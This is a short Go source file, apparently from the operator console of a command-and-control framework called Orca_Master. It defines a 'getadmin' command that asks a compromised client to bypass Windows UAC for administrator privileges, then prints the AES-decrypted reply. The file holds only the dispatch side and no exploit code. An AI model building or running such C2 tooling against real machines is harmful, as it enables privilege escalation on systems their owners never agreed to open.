package controller

import (
	"Orca_Master/cli/common"
	"Orca_Master/define/colorcode"
	"Orca_Master/define/config"
	"Orca_Master/define/retcode"
	"Orca_Master/tools/crypto"
	"fmt"
	"github.com/desertbit/grumble"
	"time"
)

var getAdminCmd = &grumble.Command{
	Name:  "getadmin",
	Help:  "bypass uac to get system administrator privileges",
	Usage: "getadmin [-h | --help]",
	Run: func(c *grumble.Context) error {
		retData := common.SendSuccessMsg(SelectClientId, common.ClientId, "getAdmin", "")
		if retData.Code != retcode.SUCCESS {
			colorcode.PrintMessage(colorcode.SIGN_FAIL, "get admin request failed")
			return nil
		}
		select {
		case msg := <-common.DefaultMsgChan:
			outputMsg, _ := crypto.Decrypt(common.GetHttpRetData(msg), []byte(config.AesKey))
			fmt.Println(outputMsg)
		case <-time.After(10 * time.Second):
			colorcode.PrintMessage(colorcode.SIGN_FAIL, "request timed out")
			return nil
		}
		time.Sleep(100 * time.Millisecond)
		return nil
	},
}
